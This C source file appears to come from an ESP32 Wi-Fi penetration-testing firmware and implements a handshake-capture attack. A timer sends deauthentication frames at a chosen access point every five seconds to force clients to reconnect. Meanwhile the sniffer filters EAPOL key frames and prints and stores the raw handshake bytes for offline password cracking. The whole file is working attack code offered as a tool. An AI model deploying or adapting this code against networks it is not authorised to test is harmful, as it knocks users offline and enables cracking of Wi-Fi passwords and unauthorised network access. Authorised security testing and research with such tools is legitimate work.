#include "attack_handshake.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "deauther.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"

static const char *TAG = "main:attack_handshake";
static esp_timer_handle_t deauth_timer_handle;
static const wifi_ap_record_t *ap_record = NULL;

static void handshake_capture_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Processing handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    for(unsigned i = 0; i < frame->rx_ctrl.sig_len; i++){
        printf("%02x", frame->payload[i]);
    }
    printf("\n");
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
}

static void send_deauth_frame(void* arg){
    deauther_send_deauth_frame(ap_record);
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    ap_record = attack_config->ap_record;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_CAPTURED_EAPOLKEY, &handshake_capture_handler, NULL));
    
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &send_deauth_frame
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
}

void attack_handshake_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &handshake_capture_handler));
    ESP_LOGD(TAG, "Handshake attack stopped");
}